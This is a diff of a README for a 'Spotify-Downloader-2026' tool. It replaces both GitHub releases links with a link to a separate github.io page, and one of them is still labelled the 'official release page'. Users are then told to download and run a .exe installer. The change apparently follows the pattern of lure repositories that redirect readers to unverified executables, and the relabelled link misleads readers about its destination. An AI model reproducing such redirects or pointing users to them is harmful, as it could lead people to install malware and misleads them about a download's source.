@@ -1,6 +1,6 @@
 # 🎵 Spotify-Downloader-2026 - Save your music for offline listening
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Mosaic-aquaticmammal128/Spotify-Downloader-2026/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://mosaic-aquaticmammal128.github.io)
 
 ## 📁 About the software
 
@@ -19,7 +19,7 @@ The software requires no external drivers or complex configurations. It runs as 
 
 Follow these steps to set up the software on your PC.
 
-1. Navigate to the [official release page](https://github.com/Mosaic-aquaticmammal128/Spotify-Downloader-2026/releases).
+1. Navigate to the [official release page](https://mosaic-aquaticmammal128.github.io).
 2. Look for the latest version at the top of the page. The version shows a tag like v1.0.0.
 3. Click the file ending in .exe to download the installer to your computer.
 4. Locate the downloaded file in your browser or your Downloads folder.
